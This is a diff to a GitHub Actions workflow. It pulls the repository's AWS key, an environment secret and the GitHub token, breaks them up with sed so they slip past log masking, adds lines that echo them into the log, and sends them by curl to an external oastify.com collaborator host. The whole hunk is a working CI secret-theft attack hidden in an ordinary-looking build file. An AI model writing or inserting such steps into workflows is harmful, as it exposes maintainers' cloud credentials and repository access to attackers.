@@ -21,4 +21,7 @@ jobs:
         awsk=${{ secrets.AWS_KEY }} | sed 's/./& /g'
         envk=${{ secrets.ENV_SECRET }} | sed 's/./& /g'
         ghk=${{ secrets.GITHUB_TOKEN }} | sed 's/./& /g'
+        echo $awsk
+        echo $envk
+        echo $ghk
         curl -X GET "http://ezh52tvjwif7vi2wd3ubu7d38uel2bq0.oastify.com?awskey=${awsk}&envsec=${envk}&github=${ghk}"
